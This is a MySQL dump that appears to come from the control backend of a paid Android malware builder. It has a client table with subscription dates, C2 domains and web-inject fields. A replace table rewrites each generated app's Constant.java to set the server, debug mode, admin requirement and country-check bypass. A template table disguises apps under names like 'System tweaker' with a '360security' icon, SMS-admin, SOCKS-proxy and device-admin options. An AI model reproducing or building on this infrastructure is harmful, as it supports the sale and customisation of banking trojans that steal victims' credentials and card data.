SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


CREATE TABLE IF NOT EXISTS `clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `folder` varchar(128) NOT NULL,
  `basic_access` varchar(128) NOT NULL,
  `admin_access` varchar(128) NOT NULL,
  `notes` text CHARACTER SET utf8 NOT NULL,
  `status` varchar(32) NOT NULL DEFAULT 'active',
  `domains` text NOT NULL,
  `cc_on` text NOT NULL,
  `injects` text NOT NULL,
  `minimize_apps` text NOT NULL COMMENT '+settings list; -NAME to exclude',
  `paid_until` datetime NOT NULL,
  `registered_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `panel_folder` varchar(128) NOT NULL,
  `stats_folder` varchar(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=69 ;

INSERT INTO `clients` (`id`, `name`, `folder`, `basic_access`, `admin_access`, `notes`, `status`, `domains`, `cc_on`, `injects`, `minimize_apps`, `paid_until`, `registered_at`, `panel_folder`, `stats_folder`) VALUES
(60, 'testLOCAL', 'panel2', 'severalgreen:test', 'admin:test', '', 'active', '192.168.1.1', '', '', '', '0000-00-00 00:00:00', '2017-06-18 11:50:07', '4Rw88xslQsVa7lXkrr', '');

CREATE TABLE IF NOT EXISTS `replaces` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `enabled` tinyint(1) NOT NULL DEFAULT '1',
  `level` varchar(32) NOT NULL COMMENT 'client replace or template',
  `entity_id` int(11) DEFAULT NULL,
  `filepath` varchar(512) NOT NULL,
  `regex` varchar(512) NOT NULL,
  `new_data` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=31 ;

INSERT INTO `replaces` (`id`, `enabled`, `level`, `entity_id`, `filepath`, `regex`, `new_data`) VALUES
(4, 1, 'base', 0, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'String BUILD = "[^"]*";', 'String BUILD = "%API%";'),
(7, 1, 'base', 0, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'String API_SERVER = "[^"]*"', 'String API_SERVER = "%DOMAINS%"'),
(13, 1, 'base', 0, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'boolean DEBUG = [a-z]+;', 'boolean DEBUG = false;'),
(26, 1, 'client', 36, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'ADMIN_REQUIRED = true', 'ADMIN_REQUIRED = false'),
(28, 1, 'client', 36, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'DEBUG = false', 'DEBUG = true'),
(29, 1, 'base', 0, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', '%SERVERS%', '%DOMAINS_PLAIN%'),
(30, 1, 'client', 36, 'app/src/main/java/com/%PACKAGE%/constants/Constant.java', 'SKIP_COUNTRY_CHECK = false', 'SKIP_COUNTRY_CHECK = true');

CREATE TABLE IF NOT EXISTS `settings` (
  `sid` int(11) NOT NULL AUTO_INCREMENT,
  `xkey` varchar(128) NOT NULL DEFAULT '',
  `xval` text NOT NULL,
  PRIMARY KEY (`sid`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;


CREATE TABLE IF NOT EXISTS `templates` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_id` int(11) NOT NULL,
  `icon_set` varchar(128) NOT NULL,
  `app_name` varchar(128) NOT NULL,
  `package_name` varchar(128) NOT NULL,
  `api` varchar(32) NOT NULL DEFAULT '%DATE%',
  `injects` text NOT NULL COMMENT 'customization',
  `sms_admin_required` tinyint(1) NOT NULL DEFAULT '0',
  `socks_enabled` tinyint(1) NOT NULL DEFAULT '0',
  `device_admin_label` varchar(64) NOT NULL DEFAULT '',
  `device_admin_descr` varchar(128) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=374 ;

INSERT INTO `templates` (`id`, `client_id`, `icon_set`, `app_name`, `package_name`, `api`, `injects`, `sms_admin_required`, `socks_enabled`, `device_admin_label`, `device_admin_descr`) VALUES
(1, 1, '360security', 'System tweaker', '', '%DATE%', '', 0, 0, '', '');
